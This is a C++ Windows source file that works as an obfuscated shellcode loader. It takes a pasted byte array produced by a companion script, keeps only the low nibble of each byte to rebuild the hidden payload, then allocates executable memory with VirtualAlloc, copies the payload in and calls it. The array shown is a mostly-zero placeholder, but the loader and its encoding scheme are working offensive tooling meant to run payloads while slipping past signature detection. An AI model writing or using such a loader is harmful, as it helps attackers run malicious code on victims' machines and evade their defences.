#include <windows.h>
#include <iostream>
#include <string>
#include <algorithm>
#include <sstream>
#include <iomanip>


using namespace std;

int main(){

	//PASTE THE OUTPUT FROM shell_o.py in here, *FOLLOW THE CHARACTER COUNT!*
	unsigned char s[] = 
    {"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x0c"
	"\x00\x00\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00"};
	
	stringstream stream;

	for (int k = 0; k < sizeof s; k++){
		stream << setfill('0') << setw(2) << right << hex << (int)s[k];
	}

	//Removing the \x

	string coluna = stream.str();

	string result;

	for (int i = 1; i < coluna.size(); i = i + 2){ 
		result += coluna[i];
	}

	//Sending the deobfuscated shellcode to an string

	string newString;
	for (int i = 0; i < result.length(); i+=2)
	{
		string byte = result.substr(i, 2);
		char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
		newString.push_back(chr);
	}

	//Allocating the shellcode in memory

	void *buffer = VirtualAlloc(0, newString.length(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//Copying the bytes from the string to the allocated memory space
    
    RtlCopyMemory(buffer, newString.c_str(), newString.length());

    //Running the allocated memory region!

    ((void(*)())buffer)();
	
	return 0;
}
